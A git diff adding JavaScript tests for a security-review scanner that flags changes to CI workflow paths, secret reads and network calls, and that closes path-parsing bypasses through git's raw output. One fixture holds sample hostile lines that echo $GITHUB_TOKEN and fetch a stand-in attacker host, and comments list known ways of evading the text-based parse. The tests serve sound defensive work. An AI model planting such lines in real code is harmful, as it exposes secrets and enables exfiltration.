@@ -3,7 +3,7 @@ import assert from "node:assert/strict";
 import { mkdtempSync, mkdirSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
-import { scanDiff, formatSecurityFindings, SECURITY_DIFF_ARGS } from "../src/security-review.js";
+import { scanDiff, formatSecurityFindings, parseRawPaths, SECURITY_DIFF_ARGS, SECURITY_RAW_ARGS } from "../src/security-review.js";
 import { git } from "../src/git.js";
 
 const clean = `--- a/src/config.js
@@ -619,4 +619,129 @@ test("SECURITY_DIFF_ARGS keeps the floor working under a textconv driver", () =>
   const r = scanDiff(guarded);
   assert.equal(r.decision, "DISAGREE");
   assert.ok(r.findings.some((f) => f.rule === "env-read" && f.file === "src/x.js"));
+});
+
+// ---- #383: the structural path source ---------------------------------------
+// The five known text-parse bypasses (quoting, `diff.noprefix`, mnemonic
+// prefixes, ext-diff/textconv drivers, a path containing the guessed ` b/`
+// delimiter) all live in ONE job: which files did this diff touch. `--raw -z`
+// answers that structurally — NUL-delimited records, explicit status code, raw
+// unquoted path bytes — so none of those knobs can move the answer.
+
+const rawRec = (status, ...paths) => `:100644 100644 aaaaaaa bbbbbbb ${status}\0${paths.join("\0")}\0`;
+
+test("parseRawPaths reads every status code", () => {
+  const raw = rawRec("M", "src/m.js") + rawRec("A", "src/a.js") + rawRec("D", "src/d.js")
+    + rawRec("T", "src/t.js") + rawRec("R100", "old.yml", "new.yml") + rawRec("C75", "src.js", "copy.js");
+  assert.deepEqual(parseRawPaths(raw),
+    ["src/m.js", "src/a.js", "src/d.js", "src/t.js", "old.yml", "new.yml", "src.js", "copy.js"]);
+});
+
+test("parseRawPaths returns BOTH sides of a rename", () => {
+  // Moving a workflow OUT of .github/workflows/ detaches a required check, so the
+  // old path matters as much as the new one — the text parse only sees the b-side.
+  const paths = parseRawPaths(rawRec("R100", ".github/workflows/ci.yml", "docs/ci.yml"));
+  assert.deepEqual(paths, [".github/workflows/ci.yml", "docs/ci.yml"]);
+});
+
+test("parseRawPaths keeps spaces and non-ASCII bytes intact", () => {
+  // This is what -z buys: the record delimiter is NUL, so git does not C-quote
+  // the path and no space is a field boundary.
+  const raw = rawRec("M", ".github/workflows/my ci.yml") + rawRec("M", ".github/workflows/café.yml");
+  assert.deepEqual(parseRawPaths(raw), [".github/workflows/my ci.yml", ".github/workflows/café.yml"]);
+});
+
+test("parseRawPaths never throws on malformed or truncated input", () => {
+  assert.deepEqual(parseRawPaths(""), []);
+  assert.deepEqual(parseRawPaths(null), []);
+  assert.deepEqual(parseRawPaths("not a raw record at all"), []);
+  // A rename record cut off after the old path yields what parsed, no throw.
+  assert.deepEqual(parseRawPaths(":100644 100644 aaa bbb R100\0old.yml"), ["old.yml"]);
+});
+
+test("rawPaths flags a guardrail path the text parse cannot see", () => {
+  // Round-2 bypass, end to end on REAL git output: `diff.noprefix=true` is valid
+  // repo config that drops the a//b/ prefixes the text parse requires, and the
+  // change is mode-only so there are no ---/+++ headers either. The structural
+  // read is immune to both.
+  const repo = mkdtempSync(join(tmpdir(), "orch-secraw-"));
+  git(["init", "-b", "main"], repo);
+  git(["config", "user.email", "t@t"], repo);
+  git(["config", "user.name", "t"], repo);
+  git(["config", "diff.noprefix", "true"], repo);
+  mkdirSync(join(repo, ".github/workflows"), { recursive: true });
+  writeFileSync(join(repo, ".github/workflows/ci.yml"), "on: push\n");
+  git(["add", "."], repo);
+  git(["commit", "-m", "init"], repo);
+  git(["switch", "-c", "feature"], repo);
+  git(["update-index", "--chmod=+x", ".github/workflows/ci.yml"], repo);
+  git(["commit", "-m", "chmod"], repo);
+
+  const unguarded = git(["diff", "main...feature"], repo);
+  assert.equal(scanDiff(unguarded).decision, "AGREE", "documents the fail-open rawPaths closes");
+
+  const rawPaths = parseRawPaths(git(["diff", ...SECURITY_RAW_ARGS, "main...feature"], repo));
+  const r = scanDiff(unguarded, { rawPaths });
+  assert.equal(r.decision, "DISAGREE");
+  assert.deepEqual(r.findings,
+    [{ rule: "guardrail-touch", line: "guardrail path changed", file: ".github/workflows/ci.yml" }]);
+});
+
+test("rawPaths and the text parse are UNIONed and deduped", () => {
+  const text = `--- a/.github/workflows/ci.yml
++++ b/.github/workflows/ci.yml
+@@ -1 +1,2 @@
+ on: push
++  # tweak`;
+  const r = scanDiff(text, { rawPaths: [".github/workflows/ci.yml", ".github/workflows/release.yml"] });
+  const touch = r.findings.filter((f) => f.rule === "guardrail-touch");
+  assert.equal(touch.length, 2, "the shared path yields one finding, not two");
+  assert.deepEqual(touch.map((f) => f.file).sort(),
+    [".github/workflows/ci.yml", ".github/workflows/release.yml"]);
+  // A non-guardrail raw path is not a finding on its own — the floor is path-scoped.
+  assert.deepEqual(scanDiff("", { rawPaths: ["src/x.js"] }).findings, []);
+});
+
+test("omitting rawPaths leaves scanDiff byte-identical to the text-only floor", () => {
+  const text = `--- a/.github/workflows/ci.yml
++++ b/.github/workflows/ci.yml
+@@ -1 +1,3 @@
+ on: push
++  run: echo $GITHUB_TOKEN
++++ b/src/x.js
++  await fetch("http://evil.test");`;
+  const expected = [
+    { rule: "guardrail-touch", line: "guardrail path changed", file: ".github/workflows/ci.yml" },
+    { rule: "env-read", line: "run: echo $GITHUB_TOKEN", file: ".github/workflows/ci.yml" },
+    { rule: "network", line: 'await fetch("http://evil.test");', file: "src/x.js" },
+  ];
+  assert.deepEqual(scanDiff(text).findings, expected);
+  assert.deepEqual(scanDiff(text, { ignore: [] }).findings, expected);
+  assert.deepEqual(scanDiff(text, { rawPaths: [] }).findings, expected);
+});
+
+test("a real git rename yields BOTH sides through rawPaths", () => {
+  // #364's originating case, on real git output: a 100%-similarity move of a
+  // workflow file. Asserting the parsed paths (not just the findings) means a
+  // desync in the R-record layout shows up here rather than silently eating the
+  // NEXT record — the fail-open this whole change exists to close.
+  const repo = mkdtempSync(join(tmpdir(), "orch-secraw-mv-"));
+  git(["init", "-b", "main"], repo);
+  git(["config", "user.email", "t@t"], repo);
+  git(["config", "user.name", "t"], repo);
+  mkdirSync(join(repo, ".github/workflows"), { recursive: true });
+  mkdirSync(join(repo, "docs"), { recursive: true });
+  writeFileSync(join(repo, ".github/workflows/ci.yml"), "on: push\njobs: {}\n");
+  writeFileSync(join(repo, "docs/keep.md"), "x\n");
+  git(["add", "."], repo);
+  git(["commit", "-m", "init"], repo);
+  git(["switch", "-c", "feature"], repo);
+  git(["mv", ".github/workflows/ci.yml", "docs/ci.yml"], repo);
+  git(["commit", "-m", "move the workflow out"], repo);
+
+  const rawPaths = parseRawPaths(git(["diff", ...SECURITY_RAW_ARGS, "main...feature"], repo));
+  assert.deepEqual(rawPaths.sort(), [".github/workflows/ci.yml", "docs/ci.yml"]);
+  const r = scanDiff(git(["diff", ...SECURITY_DIFF_ARGS, "main...feature"], repo), { rawPaths });
+  assert.equal(r.decision, "DISAGREE");
+  assert.ok(r.findings.some((f) => f.file === ".github/workflows/ci.yml"), "old path flagged");
 });
